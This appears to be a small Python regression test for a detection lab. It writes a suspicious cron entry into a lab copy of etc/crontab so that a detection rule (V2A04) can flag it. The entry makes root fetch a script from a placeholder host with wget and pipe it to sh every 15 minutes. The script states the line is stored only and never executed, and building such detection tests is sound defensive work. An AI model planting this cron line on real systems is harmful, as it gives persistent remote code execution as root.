"""V2 regression: detect suspicious-looking wget cron text; never execute it."""
from attacks.common import append_text, run_script, target_file
RULE_ID = "V2A04"
PATH = "etc/crontab"
def apply(lab_directory):
    target_file(lab_directory, PATH)
    append_text(lab_directory, PATH, "\n*/15 * * * * root wget -qO- http://example.invalid/v2 | sh\n")
if __name__ == "__main__":
    run_script(apply, f"{RULE_ID}: stored suspicious cron text only; never executed")
